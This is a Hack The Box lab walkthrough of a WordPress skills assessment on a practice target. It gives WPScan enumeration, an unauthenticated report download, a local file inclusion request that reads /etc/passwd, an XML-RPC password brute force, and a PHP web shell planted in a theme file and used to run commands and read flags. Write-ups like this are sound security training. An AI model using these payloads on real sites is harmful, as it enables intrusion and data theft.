@@ -1,0 +1,218 @@
+---
+title: "HTB WordPress Skills Assessment Walkthrough"
+date: "2026-05-21"
+description: "A walkthrough of the Hack The Box WordPress skills assessment against the INLANEFREIGHT target, documenting enumeration, hosts-file DNS mapping, WordPress attack surface analysis, exploitation, shell access, and flag retrieval."
+tags: ["hackthebox", "htb", "walkthrough", "wordpress", "web-security", "penetration-testing", "enumeration", "dns", "linux", "shell-access"]
+---
+
+# Introduction
+
+This is HackTheBox's WordPress Skills Assessment walkthrough against the INLANEFREIGHT target.
+
+## WordPress Enumeration with WPScan
+
+After mapping the virtual host to the target IP, I ran WPScan against the discovered WordPress site:
+
+```bash
+wpscan --url=http://blog.inlanefreight.local/ --api-token=[REDACTED]
+```
+
+WPScan confirmed that the target was running WordPress and identified several important findings.
+
+| Finding | Result |
+|---|---|
+| Target URL | `http://blog.inlanefreight.local/` |
+| Web server | `Apache/2.4.29 (Ubuntu)` | 
+| WordPress version | `5.1.6` | 
+| Core vulnerabilities | `40 identified` | 
+| XML-RPC | Enabled at `/xmlrpc.php` | 
+| Readme file | Exposed at `/readme.html` | 
+| Uploads directory | Directory listing enabled at `/wp-content/uploads/` | 
+| Theme | `twentynineteen` version `1.3` |
+| Events API headers | `X-TEC-API-*` |
+
+The main takeaway from this scan is that the site is running an outdated WordPress core version with an exposed uploads directory, enabled XML-RPC, and an outdated default theme. The `X-TEC-API-*` headers also suggest that event-related WordPress functionality may be installed, which is worth investigating further.
+
+<details>
+<summary>Relevant WPScan Output</summary>
+
+```text
+[+] URL: http://blog.inlanefreight.local/ [10.129.2.133]
+[+] Command Line: wpscan --url=http://blog.inlanefreight.local/ --api-token=[REDACTED]
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.29 (Ubuntu)
+ |  - X-TEC-API-VERSION: v1
+ |  - X-TEC-API-ROOT: http://blog.inlanefreight.local/index.php?rest_route=/tribe/events/v1/
+ |  - X-TEC-API-ORIGIN: http://blog.inlanefreight.local
+
+[+] XML-RPC seems to be enabled:
+ | http://blog.inlanefreight.local/xmlrpc.php
+
+[+] WordPress readme found:
+ | http://blog.inlanefreight.local/readme.html
+
+[+] Upload directory has listing enabled:
+ | http://blog.inlanefreight.local/wp-content/uploads/
+
+[+] The external WP-Cron seems to be enabled:
+ | http://blog.inlanefreight.local/wp-cron.php
+
+[+] WordPress version 5.1.6 identified
+ | Insecure, released on 2020-06-10
+ | 40 vulnerabilities identified
+
+[+] WordPress theme in use: twentynineteen
+ | Location: http://blog.inlanefreight.local/wp-content/themes/twentynineteen/
+ | Version: 1.3
+ | The version is out of date; latest version is 3.3
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done: 2
+ | Requests Remaining: 23
+```
+
+</details>
+
+### Users Enumeration
+
+The next assessment question asked for the only non-admin WordPress user in first-name last-name format. I enumerated WordPress users with WPScan:
+
+```bash
+wpscan --url=http://blog.inlanefreight.local/ --api-token=[REDACTED] -e u
+```
+
+WPScan identified three users:
+
+```text
+[+] erika
+ | Found By: Author Posts - Display Name (Passive Detection)
+
+[+] admin
+ | Found By: Author Posts - Display Name (Passive Detection)
+
+[+] Charlie Wiggins
+ | Found By: Author Id Brute Forcing - Display Name (Aggressive Detection)
+```
+
+The `admin` account was excluded because the question specifically asked for the non-admin user. The only user returned in the requested `<first-name> <last-name>` format was:
+
+```text
+Charlie Wiggins
+```
+
+## Unauthenticated File Download
+
+The assessment next asked for a flag obtainable through an unauthenticated file download vulnerability in a WordPress plugin. I tested the exposed report download endpoint directly with `curl`:
+
+```bash
+curl "http://blog.inlanefreight.local/wp-admin/admin.php?page=download_report&report=users&status=all"
+```
+
+The endpoint returned a CSV export without requiring authentication:
+
+```text
+"First Name", "Last Name", "Email", "List", "Status", "Opt-In Type", "Created On"
+"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Test", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
+"admin@inlanefreight.local", "HTB{unauTh_d0wn10ad!}", "admin@inlanefreight.local", "Main", "Subscribed", "Double Opt-In", "2020-09-08 17:40:28"
+```
+
+The flag was exposed in the exported user report:
+
+```text
+HTB{unauTh_d0wn10ad!}
+```
+
+This confirmed that the vulnerable plugin allowed report downloads without requiring a valid WordPress session.
+
+## Local File Inclusion
+
+The `site-editor` plugin exposed a local file inclusion vulnerability through the `ajax_path` parameter. I used it to read `/etc/passwd`:
+
+```bash
+curl "http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"
+```
+
+The response included local system users:
+
+```text
+mrb3n:x:1000:1000:mrb3n,,,:/home/mrb3n:/bin/bash
+erika:x:1001:1001::/home/erika:/bin/bash
+frank.mclane:x:1002:1002::/home/frank.mclane:/bin/bash
+```
+
+The user beginning with the letter `f` was:
+
+```text
+frank.mclane
+```
+
+## Obtaining Command Execution and Reading the Final Flag
+
+```bash
+wpscan --url http://blog.inlanefreight.local --password-attack xmlrpc -U erika -P SecLists/Passwords/Leaked-Databases/rockyou-75.txt -t 100
+```
+
+After identifying valid WordPress credentials for `erika`, I logged into the WordPress dashboard and edited the inactive `twentyseventeen` theme's `404.php` file to include a simple command-execution payload:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+I confirmed command execution by requesting the modified theme file with the `cmd` parameter:
+
+```bash
+curl -i "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=id"
+```
+
+The response showed that commands were being executed as the Apache user:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+I then checked the current working directory:
+
+```bash
+curl -i "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=pwd"
+```
+
+```text
+/var/www/blog.inlanefreight.local/public_html/wp-content/themes/twentyseventeen
+```
+
+From there, I enumerated the `/home` directory and found the `erika` user directory:
+
+```bash
+curl -i "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls%20../../../../../../../home/"
+```
+
+```text
+erika
+frank.mclane
+mrb3n
+```
+
+Listing `/home/erika` revealed the final flag file:
+
+```bash
+curl -i "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=ls%20../../../../../../../home/erika/"
+```
+
+```text
+d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt
+```
+
+Finally, I read the flag:
+
+```bash
+curl -i "http://blog.inlanefreight.local/wp-content/themes/twentyseventeen/404.php?cmd=cat%20../../../../../../../home/erika/d0ecaeee3a61e7dd23e0e5e4a67d603c_flag.txt"
+```
+
+```text
+HTB{w0rdPr355_4SS3ssm3n7}
+```
